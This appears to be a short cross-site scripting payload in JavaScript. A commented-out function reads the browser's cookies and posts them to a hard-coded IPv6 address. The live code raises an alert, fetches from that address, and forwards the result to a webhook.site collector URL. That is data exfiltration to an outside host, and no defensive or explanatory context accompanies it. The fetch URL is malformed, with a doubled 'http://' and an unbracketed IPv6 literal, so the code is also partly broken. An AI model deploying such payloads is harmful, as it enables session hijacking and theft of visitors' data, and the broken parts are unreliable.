//function sendCookies() {
//  var xhr = new XMLHttpRequest();
//  xhr.open("POST", "http://2601:582:c482:22a0:8ca9:986f:400d:1253/", true);
//  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

//  var cookies = document.cookie;
//  xhr.send("cookies=" + encodeURIComponent(cookies));
//}

alert("Is it working?");
fetch("http://http://2601:582:c482:22a0:8ca9:986f:400d:1253:8888").then((res) => {
    return res.text();
}).then(data => {
    fetch("https://webhook.site/dca2f591-eb3a-47f9-8f5f-c5c2d1c0116d/a.png?data="+data);
})
